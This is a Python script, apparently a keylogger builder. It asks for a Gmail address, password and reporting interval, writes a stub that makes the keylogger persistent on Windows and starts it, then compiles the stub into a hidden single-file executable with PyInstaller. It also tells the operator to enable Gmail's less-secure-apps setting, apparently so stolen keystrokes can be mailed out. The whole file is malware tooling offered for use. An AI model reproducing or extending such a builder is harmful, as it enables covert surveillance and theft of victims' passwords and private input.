import os
import subprocess
WINDOWS_PYTHON_INTERPRETER_PATH = os.path.expanduser("~/.wine/drive_c/Python27/Scripts/pyinstaller.exe")
banner = """\033[0;35;40m

██╗      ██████╗  ██████╗ ███████╗██████╗ 
██║     ██╔═══██╗██╔════╝ ██╔════╝██╔══██╗
██║     ██║   ██║██║  ███╗█████╗  ██████╔╝
██║     ██║   ██║██║   ██║██╔══╝  ██╔══██╗
███████╗╚██████╔╝╚██████╔╝███████╗██║  ██║
╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
\033[0;36;40m                                By:Mido~De3vil 
\033[0m
"""
print (banner)
def date():
	email = input("\033[1;97m Email :")
	password = input("\033[1;97m password :")
	time = input("\033[1;97m time :")
	with open("Loger", "w+") as file:
		file.write("import keylogger\n")
		file.write("d = keylogger.Loger(" + time + ",'" + email + "','" + password + "')\n")
		file.write("d.become_persistent_on_windows()\n")
		file.write("d.start()\n")
		file.close()
		info()
def info():
	print("\t\033[1;33;40m[*] \033[1;32;40m 1 - Windows")
	print("\t\033[1;33;40m[*] \033[1;32;40m 2 - Linux")
	print("\033[0;37;40m")
	chose = input(">> : ")
	#tchose = chose.lower()
	if chose == "1" or chose == "Windows":
		print("\033[1;91m[+] compile_for_windows")
		try:
			compile_for_windows()
			
		except Exception as e:
			print(e)
			print ("\033[91m run as root")
	elif chose == "2" or chose == 'linux':
		compile_for_Linux()
	else:
		exit()
def compile_for_windows():
	print("[***] Don't forget to allow less secure applications in your Gmail account.")
	print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
	try:
		subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", 'Loger'])
	except Exceptaion:
		print ("\033[1;91m[!] run as root")
	
def compile_for_Linux():
	print("[***] Don't forget to allow less secure applications in your Gmail account.")
	print("Use the following link to do so https://myaccount.google.com/lesssecureapps")
	subprocess.call("pyinstaller --onefile --noconsole Loger")
try:
	date()
except KeyboardInterrupt:
	exit()
